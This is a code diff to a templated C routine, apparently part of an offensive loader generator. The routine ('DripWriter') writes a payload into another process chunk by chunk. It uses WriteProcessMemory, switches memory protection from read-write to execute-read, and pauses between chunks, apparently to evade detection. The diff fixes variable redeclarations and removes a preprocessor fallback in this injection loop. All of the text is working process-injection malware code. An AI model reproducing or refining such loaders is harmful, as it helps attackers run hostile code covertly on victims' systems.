@@ -2,6 +2,8 @@ void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char
     SIZE_T offset = 0;
     SIZE_T pageSize = 0x1000;
     ULONG oldProt;
+    PVOID protAddr;
+    SIZE_T protSize;
     
     DEBUG_PRINT("DripWriter: Starting chunked injection loop...");
 
@@ -19,29 +21,21 @@ void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char
             }
             {% endif %}
         {% else %}
-            PVOID protAddr = chunkAddress;
-            SIZE_T protSize = chunkSize;
+            protAddr = chunkAddress;
+            protSize = chunkSize;
             pfnNtProtectVirtualMemory(hTargetProcess, &protAddr, &protSize, PAGE_READWRITE, &oldProt);
         {% endif %}
 
         if (hTargetProcess == (HANDLE)-1) {
             pfnRtlMoveMemory(chunkAddress, payload + offset, chunkSize);
         } else {
-            #ifdef pfnWriteProcessMemory_DEFINED
             if (pfnWriteProcessMemory) {
                 pfnWriteProcessMemory(hTargetProcess, chunkAddress, payload + offset, chunkSize, NULL);
             }
-            #else
-            // Should be defined if hTargetProcess != -1 (remoteapc selected)
-            // But for safety in template expansion:
-            {% if execution_method == 'remoteapc' %}
-            pfnWriteProcessMemory(hTargetProcess, chunkAddress, payload + offset, chunkSize, NULL);
-            {% endif %}
-            #endif
         }
 
-        PVOID protAddr = chunkAddress;
-        SIZE_T protSize = chunkSize;
+        protAddr = chunkAddress;
+        protSize = chunkSize;
         pfnNtProtectVirtualMemory(hTargetProcess, &protAddr, &protSize, PAGE_EXECUTE_READ, &oldProt);
 
         pfnSleepEx({{ drip_delay | default(100) }}, FALSE); 
